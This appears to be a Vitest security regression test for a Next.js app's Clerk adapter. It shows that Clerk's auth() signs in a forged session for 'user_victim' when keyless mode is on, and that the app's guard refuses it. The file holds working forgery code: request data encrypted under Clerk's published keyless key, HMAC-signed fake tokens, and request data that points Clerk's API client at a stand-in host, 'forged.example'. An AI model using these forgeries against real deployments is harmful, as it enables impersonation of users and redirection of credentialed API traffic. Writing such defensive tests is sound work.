// @vitest-environment node
import { createCipheriv, createHash, createHmac, randomBytes } from 'node:crypto'
import { createRequire } from 'node:module'
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest'

/**
 * safeinsights/sssb#193 against Clerk's REAL `auth()` (@clerk/nextjs 7.10), offline. A request that Clerk's middleware
 * never saw (a path the app's proxy matcher skips) carries headers a caller forged: request data encrypted under
 * Clerk's published keyless key that names a secret key of the caller's choosing, a session token for someone else,
 * and that token's signature under the chosen key. Outside a production build, with keyless mode able to run, Clerk
 * accepts it (the first test, which shows the hole is real on the installed Clerk, and fails if Clerk ever closes it);
 * SSSB's Clerk adapter refuses to read a session until keyless mode is disabled, and once it is, Clerk refuses the
 * forged data. Only `next/headers` is replaced, to hand `auth()` the forged request as Next would, and `server-only`
 * (which `auth()` requires, and which throws outside Next's server build) is loaded as the empty module it is there.
 */

const h = vi.hoisted(() => ({ headers: new Headers() }))
vi.mock('next/headers', () => ({
    headers: async () => h.headers,
    cookies: async () => ({ get: () => undefined, getAll: () => [], has: () => false }),
}))

// `auth()` loads `server-only` with `require`, which `vi.mock` does not reach: put Next's server build of it, an empty
// module, in Node's module cache, where Clerk's own copy resolves.
{
    const fromClerk = createRequire(createRequire(import.meta.url).resolve('@clerk/nextjs/server'))
    const serverOnly = fromClerk.resolve('server-only')
    fromClerk.cache[serverOnly] = { id: serverOnly, filename: serverOnly, loaded: true, exports: {} } as NodeJS.Module
}

/**
 * Every request Clerk sends, answered here and never sent: @clerk/backend, which `vi.resetModules` does not reload,
 * keeps the `fetch` it found when it first loaded, so it is replaced before anything loads Clerk.
 */
const sent: string[] = []
vi.stubGlobal(
    'fetch',
    vi.fn(async (url: string | URL | Request) => {
        sent.push(String(url instanceof Request ? url.url : url))
        return Response.json({ data: [], total_count: 0 })
    }),
)

/** The CI variables that switch Clerk's keyless mode off (@clerk/shared's `automatedEnvironmentVariables`). */
const CI_VARIABLES = [
    'CI',
    'CONTINUOUS_INTEGRATION',
    'GITHUB_ACTIONS',
    'GITLAB_CI',
    'CIRCLECI',
    'TRAVIS',
    'BUILDKITE',
    'BITBUCKET_BUILD_NUMBER',
    'APPVEYOR',
    'CODEBUILD_BUILD_ID',
    'TF_BUILD',
    'TEAMCITY_VERSION',
    'JENKINS_URL',
    'HUDSON_URL',
    'BAMBOO_BUILDKEY',
    'CF_PAGES',
]

/** Clerk's published keyless key (`KEYLESS_ENCRYPTION_KEY` in @clerk/nextjs's server utils). */
const KEYLESS_KEY = 'clerk_keyless_dummy_key'

/**
 * `AES.encrypt(text, passphrase)` as crypto-js (which Clerk vendors) does it: OpenSSL's salted format, the key and IV
 * derived from the passphrase and an 8-byte salt by EVP_BytesToKey with MD5, AES-256-CBC, base64 of
 * `Salted__ + salt + ciphertext`.
 */
function cryptoJsEncrypt(text: string, passphrase: string): string {
    const salt = randomBytes(8)
    let derived = Buffer.alloc(0)
    let block = Buffer.alloc(0)
    while (derived.length < 48) {
        block = createHash('md5')
            .update(Buffer.concat([block, Buffer.from(passphrase), salt]))
            .digest()
        derived = Buffer.concat([derived, block])
    }
    const cipher = createCipheriv('aes-256-cbc', derived.subarray(0, 32), derived.subarray(32, 48))
    const encrypted = Buffer.concat([cipher.update(text, 'utf8'), cipher.final()])
    return Buffer.concat([Buffer.from('Salted__'), salt, encrypted]).toString('base64')
}

/** A session token for `user_victim`, unsigned: Clerk's route side decodes it, and trusts the signature header. */
function forgedToken(): string {
    const part = (value: object) => Buffer.from(JSON.stringify(value)).toString('base64url')
    const now = Math.floor(Date.now() / 1000)
    const header = part({ alg: 'RS256', typ: 'JWT', kid: 'ins_forged' })
    const payload = part({
        sub: 'user_victim',
        sid: 'sess_forged',
        iss: 'https://clerk.example.org',
        iat: now - 5,
        nbf: now - 5,
        exp: now + 60,
    })
    return `${header}.${payload}.${Buffer.from('never checked').toString('base64url')}`
}

function forgedHeaders(): Headers {
    const chosenKey = 'sk_test_chosen_by_the_caller'
    const token = forgedToken()
    return new Headers({
        'x-clerk-auth-status': 'signed-in',
        'x-clerk-auth-token': token,
        // crypto-js's `HmacSHA1(token, key).toString()`: hex.
        'x-clerk-auth-signature': createHmac('sha1', chosenKey).update(token).digest('hex'),
        'x-clerk-request-data': cryptoJsEncrypt(JSON.stringify({ secretKey: chosenKey }), KEYLESS_KEY),
        'x-clerk-clerk-url': 'http://localhost:3000/en/some.page',
    })
}

beforeEach(() => {
    vi.resetModules()
    vi.stubEnv('NODE_ENV', 'development')
    for (const name of CI_VARIABLES) vi.stubEnv(name, '')
    vi.stubEnv('NEXT_PUBLIC_CLERK_PUBLISHABLE_KEY', `pk_test_${Buffer.from('clerk.example.org$').toString('base64')}`)
    vi.stubEnv('CLERK_SECRET_KEY', 'sk_test_the_real_one')
    vi.stubEnv('CLERK_ENCRYPTION_KEY', '')
    vi.stubEnv('NEXT_PUBLIC_CLERK_KEYLESS_DISABLED', '')
    h.headers = forgedHeaders()
    sent.length = 0
})
afterEach(() => {
    vi.unstubAllEnvs()
})

describe("a forged x-clerk-auth request, outside a production build, on a path Clerk's middleware never saw", () => {
    it("is signed in by Clerk's own auth() while keyless mode is on: the hole, as Clerk ships it", async () => {
        const { auth } = await import('@clerk/nextjs/server')
        expect((await auth()).userId).toBe('user_victim')
    })

    it("is refused by SSSB's Clerk adapter", async () => {
        const { realAuth } = await import('./auth')
        await expect(realAuth.getCurrentUser()).rejects.toThrow(/NEXT_PUBLIC_CLERK_KEYLESS_DISABLED=1/)
    })

    it('is signed in by Clerk with keyless mode disabled but no secret key, and refused by SSSB', async () => {
        // With no secret or encryption key, the key Clerk tries first outside a production build is the keyless one.
        vi.stubEnv('NEXT_PUBLIC_CLERK_KEYLESS_DISABLED', '1')
        vi.stubEnv('CLERK_SECRET_KEY', '')
        const { auth } = await import('@clerk/nextjs/server')
        expect((await auth()).userId).toBe('user_victim')
        const { realAuth } = await import('./auth')
        await expect(realAuth.getCurrentUser()).rejects.toThrow(/Set CLERK_SECRET_KEY/)
    })

    it('is signed in by Clerk with only an encryption key, by a signature under an empty key, and refused by SSSB', async () => {
        // No request data at all: Clerk checks the token header against its secret key, which is empty.
        vi.stubEnv('NEXT_PUBLIC_CLERK_KEYLESS_DISABLED', '1')
        vi.stubEnv('CLERK_SECRET_KEY', '')
        vi.stubEnv('CLERK_ENCRYPTION_KEY', 'an-encryption-key-of-the-deployment')
        const token = forgedToken()
        h.headers = new Headers({
            'x-clerk-auth-status': 'signed-in',
            'x-clerk-auth-token': token,
            'x-clerk-auth-signature': createHmac('sha1', '').update(token).digest('hex'),
            'x-clerk-clerk-url': 'http://localhost:3000/en/some.page',
        })
        const { auth } = await import('@clerk/nextjs/server')
        expect((await auth()).userId).toBe('user_victim')
        const { realAuth } = await import('./auth')
        await expect(realAuth.getCurrentUser()).rejects.toThrow(/Set CLERK_SECRET_KEY/)
    })

    it('signs no one in once keyless mode is disabled: Clerk refuses the forged request data', async () => {
        vi.stubEnv('NEXT_PUBLIC_CLERK_KEYLESS_DISABLED', '1')
        const { realAuth } = await import('./auth')
        await expect(realAuth.getCurrentUser()).rejects.toThrow(/encryption key/i)
        const { auth } = await import('@clerk/nextjs/server')
        await expect(auth()).rejects.toThrow(/encryption key/i)
    })
})

describe("forged request data on a request that reads no session: Clerk's Backend API client", () => {
    /** Request data that sends Clerk's client to a server of the caller's choosing, with no session at all. */
    function forgedApiData(): Headers {
        const data = { publishableKey: 'pk_test_forged', apiUrl: 'https://forged.example' }
        return new Headers({ 'x-clerk-request-data': cryptoJsEncrypt(JSON.stringify(data), KEYLESS_KEY) })
    }
    beforeEach(() => {
        h.headers = forgedApiData()
    })

    it("follows the forged API URL in Clerk's own client while keyless mode is on: the hole, as Clerk ships it", async () => {
        const { clerkClient } = await import('@clerk/nextjs/server')
        await (await clerkClient()).users.getUser('user_any').catch(() => undefined)
        expect(sent.some((url) => url.startsWith('https://forged.example/'))).toBe(true)
    })

    it("is refused by SSSB's Clerk adapter before Clerk's client is built, so nothing is sent", async () => {
        const { realAuth } = await import('./auth')
        await expect(realAuth.listMembers('depot')).rejects.toThrow(/NEXT_PUBLIC_CLERK_KEYLESS_DISABLED=1/)
        expect(sent).toEqual([])
    })
})

// safeinsights/sssb#222's review, A3: the guard refuses what Clerk leaves open and no more. What it lets through, a job
// program or an ops script or a test run with the secret key set, is a process Clerk itself refuses the same forgeries in.
describe('what the guard lets through is refused by Clerk itself, or ignored by it: the secret key set, not NODE_ENV=development', () => {
    it.each([['test'], ['production'], [undefined]])(
        'with NODE_ENV %s and the flag unset, a forgery under the keyless key fails to decrypt: Clerk throws, SSSB does not stand in the way',
        async (nodeEnv) => {
            vi.stubEnv('NODE_ENV', nodeEnv)
            const { clerkKeylessProblem } = await import('./clerk-keyless')
            expect(clerkKeylessProblem({ ...process.env })).toBeNull()
            const { auth } = await import('@clerk/nextjs/server')
            await expect(auth()).rejects.toThrow(/encryption key/i)
            // The adapter reaches Clerk, whose own refusal is what answers (not the guard's).
            const { realAuth } = await import('./auth')
            await expect(realAuth.getCurrentUser()).rejects.toThrow(/encryption key/i)
        },
    )

    it.each([['test'], ['production'], [undefined]])(
        "with NODE_ENV %s, forged request data does not move Clerk's client: it keeps the environment's API and secret key",
        async (nodeEnv) => {
            vi.stubEnv('NODE_ENV', nodeEnv)
            h.headers = new Headers({
                'x-clerk-request-data': cryptoJsEncrypt(
                    JSON.stringify({ publishableKey: 'pk_test_forged', apiUrl: 'https://forged.example' }),
                    KEYLESS_KEY,
                ),
            })
            const { realAuth } = await import('./auth')
            await realAuth.listMembers('depot').catch(() => undefined)
            expect(sent.length).toBeGreaterThan(0)
            expect(sent.some((url) => url.includes('forged.example'))).toBe(false)
        },
    )

    it('the keyless fallback is what NODE_ENV=development adds: Clerk signs the forgery in, and the guard refuses it', async () => {
        vi.stubEnv('NODE_ENV', 'development')
        const { auth } = await import('@clerk/nextjs/server')
        expect((await auth()).userId).toBe('user_victim')
        const { clerkKeylessProblem } = await import('./clerk-keyless')
        expect(clerkKeylessProblem({ ...process.env, NODE_ENV: 'development' })).toMatch(
            /NEXT_PUBLIC_CLERK_KEYLESS_DISABLED=1/,
        )
    })

    it('a production process with no secret key at all is forgeable too, which is why the guard asks for the key in every NODE_ENV', async () => {
        vi.stubEnv('NODE_ENV', 'production')
        vi.stubEnv('CLERK_SECRET_KEY', '')
        const token = forgedToken()
        // No request data: Clerk checks the token header's signature against its secret key, which is empty.
        h.headers = new Headers({
            'x-clerk-auth-status': 'signed-in',
            'x-clerk-auth-token': token,
            'x-clerk-auth-signature': createHmac('sha1', '').update(token).digest('hex'),
            'x-clerk-clerk-url': 'http://localhost:3000/en/some.page',
        })
        const { auth } = await import('@clerk/nextjs/server')
        expect((await auth()).userId).toBe('user_victim')
        const { realAuth } = await import('./auth')
        await expect(realAuth.getCurrentUser()).rejects.toThrow(/Set CLERK_SECRET_KEY/)
    })
})
